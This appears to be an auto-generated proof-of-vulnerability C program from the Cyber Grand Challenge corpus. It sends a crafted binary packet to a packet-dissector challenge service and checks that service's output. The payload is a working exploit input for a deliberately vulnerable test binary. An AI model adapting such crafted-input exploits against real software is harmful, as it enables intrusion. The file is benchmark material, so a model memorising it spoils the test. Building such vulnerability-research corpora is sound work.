#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x16\xd7\x5b\x5d"
         "\x48\x00\xea\xf9\xb7\x25\x8f\xa4\xab\x01\x00\x00\x88\x2a\x9a\xa1"
         "\x40\x00\x61\x38\xe7\x67\x40\x00\x40\x40\x00\x6e\x80\x3b\xfa\xcb"
         "\x97\xea\xe6\x61\xb9\x72\x93\xbe\x7d\x22\xba\x40\x45\x01\xef\xbd"
         "\x3c\xa6\x90\x1d\xa8\x8a\x7e\x55\x6b\xdd\x55\x49\x5c\x7a\x46\xea"
         "\x57\x80\x28\x49\xa2\xfb\x35\xc3\x03\xd9\x56\x9f\x88\xa1\xe8\x02"
         "\x7b\xdc\x61\xbe\xca\xf5\x8b\x92\x47\x45\x4e\x29\x38\x9a\x02\x41"
         "\xe0\x28\xf7\xfc\x98\x85\xf8\xd6\x22\xae\x22\xb5\xce\x1d\x6c\xa8"
         "\x1f\xf6\x47\xf9\xff\x8e\xec\x14\x9a\x29\xa1\x4e\x3b\xf2\xb6\x76"
         "\xf8\x0c\xe8\x51\x50\x85\x6a\x60\x24\xc5\x3d\x8c\x23\xc8\xb6\xd4"
         "\x74\x09\x47\x1d\xf6\x46\x0b\x29\xf4\x97\x41\x35\x34\xbd\xb7\x32"
         "\x1d\xcb\x34\x08\xbc\x1f\xb9\x1c\xfe\xf8\x58\x4b\x88\x3e\x2f\x8e"
         "\x49\x80\xf5\x7b\x70\xec\x43\xa2\x80\x25\x45\xe2\x0a\x17\xef\x10"
         "\x87\x94\xd7\xa1\x32\xfd\x2f\xbf\xd7\xb2\x70\x68\xf0\xe3\xa9\x9c"
         "\x4e\x0d\x06\x6c\x63\xea\x94\x61\xc1\x42\x94\xca\x69\xdd\x10\x6f"
         "\x5d\x0c\x77\x15\x1b\x61\x99\x71\x97\xd8\xff\xfa\xde\xb8\x8b\x98"
         "\x01\x8c\xdb\x71\xfc\x38\xac\xf2\x35\x33\x1e\x80\x60\x4f\x27\x8f"
         "\x10\x2b\x31\xde\xc1\x3b\xa3\x2a\x5d\x87\x43\xff\x08\x77\x45\x6b"
         "\xf1\x09\xe8\x49\x51\x78\x06\xb5\x76\x73\x7c\x11\x29\x40\xc0\xbb"
         "\x0b\xab\x01\x0a\xff\x04\x55\xc1\xfa\x84\x48\x1b\x53\xf5\xee\xcd"
         "\x12\x31\x27\x62\xd3\x31\x4e\x19\x87\x73\x70\x6a\x0f\xda\x24\xbe"
         "\x1a\x60\xfc\x91\x59\xc9\x49\x62\x8a\xe6\xd4\x4d\x7a\xde\x77\x53"
         "\x0b\x76\xd0\xb3\x61\x4e\x48\x75\x6e\x18\x5c\x2b\x11\x28\x02\x40"
         "\x00\x40\x40\x00\x7e\xd3\xee\x8f\x31\xe7\xee\xf1\xb8\x21\xca\x9b"
         "\x7d\xa5\xd1\xc4\x4f\x07\xab\x6b\xeb\xe3\x8e\xa0\x19\x3a\x79\x74"
         "\x44\x1d\x94\xc1\x95\x2c\x61\x20\xa6\x48\x5c\x4e\x49\xa2\x73\x92"
         "\x92\xbc\x3a\xca\x94\x91\x9b\x77\x85\x28\x8c\xe9\x87\xf9\x08\x89"
         "\xc9\xf6\x7d\x77\x2f\xe1\x24\xd9\xaa\x15\x5a\x9b\xb9\x96\x58\xc2"
         "\xa0\x17\x05\x79\x21\x4f\xed\xb1\x10\x40\x48\xec\x80\x11\x0f\xe6"
         "\xcc\x8d\xd0\x58\xe3\x92\x19\xc3\x3d\x63\xd5\xf9\x6d\xb5\x61\xef"
         "\x27\xf2\xb6\xee\x93\x70\x7f\x47\x8c\xbb\xe8\xba\x9a\xc2\x32\xae"
         "\x6c\x42\x4e\x25\x0a\x57\x2a\x4a\xa5\xc9\x6f\x20\xa8\x6e\xd8\x0e"
         "\x7d\xc0\x54\x07\x31\x27\xeb\x27\x67\xf4\x63\xd4\x9c\x2f\xc9\x18"
         "\x35\x5b\x41\x20\xd2\x2c\x38\xa8\x35\xa1\x93\x51\xac\x35\x3a\x84"
         "\x98\x53\x01\x15\xc3\x9b\x90\xe5\xe4\xd0\x59\x57\x36\x57\xbf\x18"
         "\x3a\xc6\xe3\xbb\xd4\x83\xaa\x41\xf6\xb4\x69\x5e\x0f\x9d\xae\x53"
         "\xbc\xd1\xae\x12\x0b\x14\xb5\x85\x32\x61\x84\xb2\x7d\xd3\x2c\x86"
         "\x69\x74\x24\xbc\x40\x00\xfe\x90\x5d\xb2\x27\x8a\xd3\xca\xc4\xf0"
         "\xd5\x77\x40\x69\x52\xd9\xb1\x52\xaa\x70\x89\x72\xae\xf1\x5e\x56"
         "\xfb\xe6\x71\xc9\x3b\x0d\x89\xdd\x17\x5f\x2e\x70\xc3\x69\x98\x96"
         "\xc7\x7c\x7a\x6f\xa2\x44\x5a\x63\xd6\x99\x0b\x6b\xe2\xa7\x21\xfc"
         "\x3c\x66\x9e\x83\x98\xc2\xa7\xeb\xe3\x57\xf9\xe9\xe2\x5c\xca\xf4"
         "\x1a\xdd\x1e\xcf\xd2\x98\xd3\xbf\x5d\x47\x6a\x50\x79\x29\x7a\x89"
         "\x89\x76\xac\xb2\x90\x6c\x7a\x00\xa8\xc4\xa1\x33\x0a\x79\x16\x05"
         "\xd2\x84\x9c\x5e\xe2\x67\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===unexchangedsupraventricular
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x75\x6e\x65\x78\x63\x68\x61\x6e\x67\x65\x64"
         "\x73\x75\x70\x72\x61\x76\x65\x6e\x74\x72\x69\x63\x75\x6c\x61\x72";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
